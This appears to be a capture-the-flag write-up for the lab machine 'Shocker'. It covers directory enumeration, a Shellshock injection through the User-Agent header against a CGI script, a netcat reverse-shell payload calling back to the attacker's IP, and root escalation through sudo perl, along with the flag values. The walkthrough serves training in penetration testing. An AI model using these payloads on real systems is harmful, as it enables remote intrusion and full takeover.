# Shocker - 10.10.10.56
## port 80

Initial landing page has an image with a cartoon on it saying don't bug me! This is a hint to tell us that brute focing will not work normally

Running a standard gobuster scan with a big wordlist results in errors with canceled requests

So I need to set a timeout and use a smaller wordlist - opt for dirb's common.txt rather than dirbuster's meduim.txt

```
gobuster dir -u http://10.10.10.56/ -w /usr/share/wordlists/dirb/common.txt --timeout 100ms  
```

```
===============================================================                            
Gobuster v3.0.1                                                                            
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                            
===============================================================                            
[+] Url:            http://10.10.10.56/                                                    
[+] Threads:        10                                                                     
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt                                   
[+] Status codes:   200,204,301,302,307,401,403                                             
[+] User Agent:     gobuster/3.0.1                                                         
[+] Timeout:        100ms                                                                  
===============================================================                            
2020/05/09 19:53:10 Starting gobuster                                                      
===============================================================                            
/.hta (Status: 403)                                                                        
/.htaccess (Status: 403)                                                                   
/.htpasswd (Status: 403)                                                                   
/cgi-bin/ (Status: 403)                                                                    
Progress: 1796 / 4615 (38.92%)[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/giftcert: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/gifts: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/giftreg_manage: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/giftoptions: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/giftregs: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/gif: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/git: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
[ERROR] 2020/05/09 19:53:12 [!] Get http://10.10.10.56/gifs: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
/index.html (Status: 200)                                                                  
/server-status (Status: 403)                                                               
===============================================================                            
2020/05/09 19:53:14 Finished                                                               
===============================================================  
```
I find a few directories before recieving errors on my requests, but this is sufficient enough

The name of the box is a big hint to the exploit that will be used on the machine. Now that we have the cgi-bin directory found, need to find some kind of process that is running.

CGI stand for Common Gateway Interface. Unlike a standard http file hosted on a webserver, when a file is hosted in a certain cgi directory it is executed on the server and the result is send to the client rather than the file being sent to the client  and executed on their machine

Since this is a linux machine, we will search for files such as .sh,.pl 


```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt --timeout 1000ms -x .sh,.pl
```

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.56/cgi-bin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     sh,pl
[+] Timeout:        1s
===============================================================
2020/05/09 20:26:28 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.sh (Status: 403)
/.hta.pl (Status: 403)
/.htaccess (Status: 403)
/.htaccess.sh (Status: 403)
/.htaccess.pl (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.pl (Status: 403)
/.htpasswd.sh (Status: 403)
/user.sh (Status: 200)
===============================================================
2020/05/09 20:26:42 Finished
===============================================================
```

## https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdfi

I can test this by echoing out a string, note that spaceing matters in the curly braces

```
curl -H "User-Agent: () { :; };echo; echo vulnerable" http://10.10.10.56/cgi-bin/user.sh
```

According to owasp we can attempt a shellshock exploit by running the following command assuming that the target has nc installed on their machine

```
curl -H "User-Agent: () { :; };echo /bin/nc -e /bin/bash 10.10.14.19 1984" http://10.10.10.56/cgi-bin/user.sh
```

Nothing came through so going to try a bash reverse shell

Bash shell is successful, go through process of setting environment and work towards root

```
shelly@Shocker:/usr/lib/cgi-bin$ cd /home
shelly@Shocker:/home$ ls
shelly
shelly@Shocker:/home$ cd shelly/  
shelly@Shocker:/home/shelly$ cat user.txt 
2ec24e11320026d1e70ff3e16695b233
shelly@Shocker:/home/shelly$ 
```


## Onto root
### Always check the low hanging fruit

```
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

```

since this is a command, gtfobins will give me the win

```
sudo perl -e 'exec "/bin/sh";'
``` 
## Win!

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
# whoami
root
# cd /root
# cat root.txt
52c2715605d70c7619030560dc1ca467
# 
```
